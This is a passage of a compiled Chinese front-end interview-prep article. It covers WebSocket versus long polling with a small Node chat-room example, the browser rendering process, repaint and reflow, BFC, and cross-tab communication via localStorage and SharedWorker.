<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_11-连环问-websocket-和长轮询-长连接-的区别-扩展-创建简易聊天室" tabindex="-1"><a class="header-anchor" href="#_11-连环问-websocket-和长轮询-长连接-的区别-扩展-创建简易聊天室" aria-hidden="true">#</a> 11：连环问：webSocket 和长轮询（长连接）的区别-扩展-创建简易聊天室</h2><ul><li>http 长轮询 - 客户端发起 http 请求，server 不立即返回，等待有结果再返回。这期间 TCP 连接不会关闭，阻塞式。（需要处理 timeout 的情况）</li><li>webSocket - 客户端发起请求，服务端接收，连接关闭。服务端发起请求，客户端接收，连接关闭。非阻塞。</li></ul><p><img src="`+x+`" alt=""></p><h4 id="注意" tabindex="-1"><a class="header-anchor" href="#注意" aria-hidden="true">#</a> 注意：</h4><ul><li><code>HTTP 长轮询</code>，需要处理 <code>timeout</code> ，即 <code>timeout</code> 之后重新发送请求</li></ul><h4 id="聊天室" tabindex="-1"><a class="header-anchor" href="#聊天室" aria-hidden="true">#</a> 聊天室</h4><p>服务端</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">const</span> <span class="token punctuation">{</span> WebSocketServer <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&#39;ws&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> wsServer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocketServer</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <span class="token literal-property property">port</span><span class="token operator">:</span> <span class="token number">3000</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

wsServer<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">&#39;connection&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">curWs</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&#39;connected&#39;</span><span class="token punctuation">)</span>
  <span class="token comment">// 这里，不能一直被 add 。实际使用中，这里应该有一些清理缓存的机制，长期用不到的 ws 要被 delete</span>
  list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>curWs<span class="token punctuation">)</span>
  curWs<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">&#39;message&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&#39;received message&#39;</span><span class="token punctuation">,</span> msg<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment">// 传递给其他客户端</span>
    list<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">ws</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>ws <span class="token operator">===</span> curWs<span class="token punctuation">)</span> <span class="token keyword">return</span>
      ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="客户端-1" tabindex="-1"><a class="header-anchor" href="#客户端-1" aria-hidden="true">#</a> 客户端</h4><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>en<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>X-UA-Compatible<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>IE=edge<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>viewport<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>width=device-width, initial-scale=1.0<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>websocket<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>websocket page 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>btn-send<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>发送消息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
      <span class="token keyword">const</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">&#39;ws://127.0.0.1:3000&#39;</span><span class="token punctuation">)</span>
      ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&#39;opened&#39;</span><span class="token punctuation">)</span>
        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">&#39;client1 opened&#39;</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
      ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&#39;client1 received&#39;</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">const</span> btnSend <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&#39;btn-send&#39;</span><span class="token punctuation">)</span>
      btnSend<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#39;click&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&#39;clicked&#39;</span><span class="token punctuation">)</span>
        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">&#39;client1 time is &#39;</span> <span class="token operator">+</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>en<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>X-UA-Compatible<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>IE=edge<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>viewport<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>width=device-width, initial-scale=1.0<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>websocket<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>websocket page 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>btn-send<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>发送消息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
      <span class="token keyword">const</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">&#39;ws://127.0.0.1:3000&#39;</span><span class="token punctuation">)</span>
      ws<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&#39;opened&#39;</span><span class="token punctuation">)</span>
        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">&#39;client2 opened&#39;</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
      ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&#39;client2 received&#39;</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">const</span> btnSend <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">&#39;btn-send&#39;</span><span class="token punctuation">)</span>
      btnSend<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#39;click&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">&#39;clicked&#39;</span><span class="token punctuation">)</span>
        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">&#39;client2 time is &#39;</span> <span class="token operator">+</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_12-从输入-url-到网页显示的完整过程" tabindex="-1"><a class="header-anchor" href="#_12-从输入-url-到网页显示的完整过程" aria-hidden="true">#</a> 12: 从输入 URL 到网页显示的完整过程</h2><h3 id="题目-8" tabindex="-1"><a class="header-anchor" href="#题目-8" aria-hidden="true">#</a> 题目</h3><p>从输入 url 到显示页面的完整过程</p><h3 id="特别注意" tabindex="-1"><a class="header-anchor" href="#特别注意" aria-hidden="true">#</a> 特别注意</h3><p>现在浏览器经过多年发展和优化，加载和渲染机制已经非常复杂，我们只能讲解基本的流程。不可较真细节。</p><h3 id="步骤" tabindex="-1"><a class="header-anchor" href="#步骤" aria-hidden="true">#</a> 步骤</h3><ul><li>网络请求</li><li>解析</li><li>渲染页面</li></ul><h3 id="网络请求" tabindex="-1"><a class="header-anchor" href="#网络请求" aria-hidden="true">#</a> 网络请求</h3><ul><li>DNS 解析，根据域名获得 IP 地址</li><li>建立 TCP 连接 “三次握手”</li><li>发送 http 请求</li><li>接收请求响应，获得网页 html 代码</li></ul><h3 id="继续请求静态资源" tabindex="-1"><a class="header-anchor" href="#继续请求静态资源" aria-hidden="true">#</a> 继续请求静态资源</h3><ul><li>解析 HTML 过程中，遇到静态资源还会继续发起网络请求</li><li>JS CSS 图片 视频等</li><li>注意：静态资源可能会有强缓存，此时不必请求</li></ul><p><img src="`+q+'" alt=""></p><h3 id="解析-字符串-结构化数据" tabindex="-1"><a class="header-anchor" href="#解析-字符串-结构化数据" aria-hidden="true">#</a> 解析: 字符串-&gt;结构化数据</h3><blockquote><p>html css 等源代码是字符串形式，需要解析为特定的数据结构，才能被后续使用。</p></blockquote><p>过程</p><ul><li>html 构建 DOM 树</li><li>css 构建 CSSOM（即 style tree）</li><li>两者结合形成 Render tree （包括尺寸、定位等）</li></ul><p><img src="'+S+`" alt=""></p><p>解析过程很复杂</p><ul><li><p>css 包括：</p><ul><li>内嵌 css <code>&lt;style&gt;</code></li><li>外链 css <code>&lt;link&gt;</code></li></ul></li><li><p>解析到 <code>&lt;script&gt;</code> 加载，并有可能修改 DOM 树和 render tree 。</p><ul><li>内嵌 js</li><li>外链 js</li></ul><p>PS：加载和执行 <code>&lt;script&gt;</code> 的情况比较多，如有 <code>defer</code> <code>async</code> 属性，就不一样。</p></li><li><p>解析到 <code>&lt;img&gt;</code> 等媒体文件，也要并行加载。加载完成后再渲染页面。</p></li></ul><p>综上，为了避免不必要的情况，要遵守以下规则(<strong>优化解析</strong>)</p><ul><li>css 尽量放在 <code>&lt;head&gt;</code> 中，不要异步加载 css</li><li>js 尽量放在 <code>&lt;body&gt;</code> 最后(或者合理使用 <code>defer</code>和 <code>async</code>)，不要中途加载、执行 js</li><li><code>&lt;img&gt;</code> 等媒体文件尽量限制尺寸(<code>width</code>、<code>height</code>)，防止渲染时重绘页面</li></ul><h3 id="渲染页面" tabindex="-1"><a class="header-anchor" href="#渲染页面" aria-hidden="true">#</a> 渲染页面</h3><p>通过 render tree 绘制页面。</p><p>绘制完成之后，还要继续执行异步加载的资源</p><ul><li>计算各个 DOM 的尺寸、定位，最后绘制页面</li><li>异步的 css ，重新渲染页面</li><li>异步的 js(参考 <code>defer</code> <code>sync</code>) ，执行（可能重新渲染页面）</li><li>异步加载的图片等，可能重新渲染页面（根据图片尺寸）</li></ul><p>最后页面渲染完成。</p><h3 id="答案-8" tabindex="-1"><a class="header-anchor" href="#答案-8" aria-hidden="true">#</a> 答案</h3><ul><li>网络请求 <ul><li>DNS 解析</li><li>TCP 连接</li><li>HTTP 请求和响应</li></ul></li><li>解析 <ul><li>DOM 树</li><li>CSSOM 树</li><li>Render tree</li></ul></li><li>渲染页面 <ul><li>可能重绘页面</li></ul></li></ul><h3 id="划重点-3" tabindex="-1"><a class="header-anchor" href="#划重点-3" aria-hidden="true">#</a> 划重点</h3><ul><li>现代浏览器的渲染机制非常复杂，不要纠结细节</li><li>要深入理解 “字符串” -&gt; ”结构化数据“ 这一步</li><li>要能画出流畅图</li></ul><h2 id="_13-连环问-什么是重绘-repaint-和重排-reflow-有何区别" tabindex="-1"><a class="header-anchor" href="#_13-连环问-什么是重绘-repaint-和重排-reflow-有何区别" aria-hidden="true">#</a> 13: 连环问：什么是重绘 repaint 和重排 reflow ，有何区别</h2><h3 id="动态网页-随时都会重排、重绘" tabindex="-1"><a class="header-anchor" href="#动态网页-随时都会重排、重绘" aria-hidden="true">#</a> 动态网页，随时都会重排、重绘</h3><p>页面渲染完成之后，随着异步加载和用户的操作，会随时发生 repaint 或者 reflow 。例如</p><ul><li>各种网页动画</li><li>modal dialog 弹框</li><li>页面元素的新增、删除和隐藏</li></ul><p>结论：<strong>重排的影响更大</strong></p><ul><li><strong>重绘 repaint</strong> ：某些元素的外观被改变，但尺寸和定位不变，例如：元素的背景色改变。</li><li><strong>重排 reflow</strong> ：重新计算尺寸和布局，可能会影响其他元素的位置。如一个元素高度变化，导致所有元素都下移。</li></ul><p>重绘不一定重排，但重排一定会导致重绘。<br> 所以，要尽量避免重排。</p><h3 id="减少重排的方法" tabindex="-1"><a class="header-anchor" href="#减少重排的方法" aria-hidden="true">#</a> 减少重排的方法</h3><ul><li>集中修改样式，或直接使用 <code>class</code></li><li>DOM 操作前先使用 <code>display: none</code> 脱离文档流</li><li>使用 BFC ，不影响外部的元素</li><li>对于频繁触发的操作（<code>resize</code> <code>scroll</code> 等）使用节流和防抖</li><li>使用 <code>createDocumentFragment</code> 进行批量 DOM 操作</li><li>优化动画，如使用 <code>requestAnimationFrame</code> 或者 CSS3（可启用 GPU 加速）</li></ul><h3 id="连环问-触发-css-bfc-的条件" tabindex="-1"><a class="header-anchor" href="#连环问-触发-css-bfc-的条件" aria-hidden="true">#</a> 连环问：触发 css BFC 的条件</h3><h3 id="bfc" tabindex="-1"><a class="header-anchor" href="#bfc" aria-hidden="true">#</a> BFC</h3><ul><li>BFC - Block Formatting Context 块格式化上下文</li><li>内部元素无论如何改动，都不会影响其他元素的位置</li></ul><h3 id="触发-bfc-的条件" tabindex="-1"><a class="header-anchor" href="#触发-bfc-的条件" aria-hidden="true">#</a> 触发 BFC 的条件</h3><ul><li>根节点 html</li><li>设置 float: <code>left</code> <code>right</code></li><li>设置 overflow: <code>auto</code> <code>scroll</code> <code>hidden</code></li><li>设置 display: <code>inline-block</code> <code>table</code> <code>table-cell</code> <code>flex</code> <code>grid</code></li><li>设置 position: <code>absolute</code> <code>fixed</code></li></ul><h2 id="_14-如何实现网页多标签-tab-通讯" tabindex="-1"><a class="header-anchor" href="#_14-如何实现网页多标签-tab-通讯" aria-hidden="true">#</a> 14: 如何实现网页多标签 tab 通讯</h2><h3 id="题目-9" tabindex="-1"><a class="header-anchor" href="#题目-9" aria-hidden="true">#</a> 题目</h3><p>网络多标签之间如何通讯？<br> 例如打开两个 chrome 标签，一个访问列表页，一个访问详情页。在详情页修改了标题，列表页也要同步过来。</p><h3 id="websocket-1" tabindex="-1"><a class="header-anchor" href="#websocket-1" aria-hidden="true">#</a> webSocket</h3><p>通过 webSocket 多页面通讯，无跨域限制。</p><h3 id="localstorage" tabindex="-1"><a class="header-anchor" href="#localstorage" aria-hidden="true">#</a> localStorage</h3><p>(localStorage 跨域不共享)</p><p><strong>同域</strong>的两个页面，可以通过 localStorage 通讯。A 页面可以监听到 B 页面的数据变化。</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token comment">// list 页面</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&#39;storage&#39;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;key&#39;</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>key<span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&#39;newValue&#39;</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>newValue<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// detail 页面</span>
localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">&#39;changeInfo&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;xxx&#39;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="sharedworker" tabindex="-1"><a class="header-anchor" href="#sharedworker" aria-hidden="true">#</a> SharedWorker</h3><ul><li>SharedWorker 是 WebWorker 的一种</li><li>WebWorker 可开启<strong>子进程</strong>执行 JS,但是不能操作 DOM</li><li>Sharedworker 可单独开启一个进程，用于<strong>同域</strong>页面通讯</li></ul><p>Javascript 是单线程的，而且和页面渲染线程互斥。所以，一些计算量大的操作会影响页面渲染。<br></p>`,68),V={href:"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Workers_API/Using_web_workers",target:"_blank",rel:"noopener noreferrer"},Y=n("code",null,"new Worker('xxx.js')",-1),K=n("code",null,"postMessage",-1),Q=n("code",null,"onmessage",-1),$=n("br",null,null,-1),Z=n("p",null,"PS：WebWorker 专用于 JS 计算，不支持 DOM 操作。",-1),nn={href:"https://developer.mozilla.org/zh-CN/docs/Web/API/SharedWorker",target:"_blank",rel:"noopener noreferrer"},an=n("br",null,null,-1),sn=n("code",null,"chrome://inspect",-1),tn=e(`<p>PS：注意浏览器兼容性，不支持 IE11</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token doc-comment comment">/**
 * <span class="token keyword">@description</span> for SharedWorker
 * <span class="token keyword">@author</span> 双越老师
 */</span>

<span class="token keyword">const</span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function-variable function">onconnect</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> port <span class="token operator">=</span> event<span class="token punctuation">.</span>ports<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
  set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span>

  <span class="token comment">// 接收信息</span>
  port<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// 广播消息</span>
    set<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">p</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">===</span> port<span class="token punctuation">)</span> <span class="token keyword">return</span>
      p<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// 发送信息</span>
  port<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">&#39;worker.js done&#39;</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token comment">&lt;!-- msg-sharedWork-list.html --&gt;</span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
